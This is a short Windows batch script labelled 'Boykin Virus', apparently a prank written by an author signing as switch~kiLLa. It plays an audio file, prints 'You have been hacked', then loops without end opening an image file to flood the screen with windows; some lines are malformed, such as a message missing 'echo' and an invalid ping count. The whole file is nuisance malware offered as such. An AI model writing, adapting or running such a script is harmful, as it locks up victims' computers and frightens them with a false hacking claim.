@ECHO OFF
Rem Boykin Virus
Rem Made by switch~kiLLa
SET BROWSER=chrome.exe
:before
set counter=0
set b=1
start Jazzl1.mp3
echo You have been hacked by switch~kiLLa
ping localhost -n 2 >null
:loop
set /a counter=%counter% + %b%
start SCREENSHOT90DFB.jpg
ping localhost -n .5 >null
You have %counter% tabs opened >:D
goto loop
pause